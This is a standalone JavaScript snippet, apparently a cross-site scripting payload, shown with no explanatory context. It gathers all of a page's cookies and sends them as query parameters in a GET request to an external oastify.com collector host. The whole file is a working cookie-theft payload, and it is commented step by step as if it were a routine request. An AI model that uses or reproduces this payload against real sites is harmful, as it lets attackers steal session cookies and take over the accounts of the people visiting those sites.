// Retrieve all cookies
var cookies = {};
document.cookie.split(';').forEach(function (cookie) {
  var parts = cookie.trim().split('=');
  cookies[parts[0]] = parts[1];
});

// Check if any cookies were found
if (Object.keys(cookies).length > 0) {
  // Define the URL where you want to send the data
  var apiUrl = 'https://xuva4lxh50dbd0c5gqs3na5ncei56wul.oastify.com';

  // Append the cookies as query parameters to the URL
  apiUrl += '?';
  for (var cookieKey in cookies) {
    apiUrl += encodeURIComponent(cookieKey) + '=' + encodeURIComponent(cookies[cookieKey]) + '&';
  }
  apiUrl = apiUrl.slice(0, -1); // Remove the last '&'

  // Create a new XMLHttpRequest object
  var xhr = new XMLHttpRequest();

  // Set up the GET request
  xhr.open('GET', apiUrl, true);

  // Define a callback function to handle the response
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      // Request was successful, you can handle the response here
      var response = JSON.parse(xhr.responseText);
      console.log('Response from the server:', response);
    }
  };

  // Send the GET request
  xhr.send();
} else {
  console.log('No cookies found.');
}
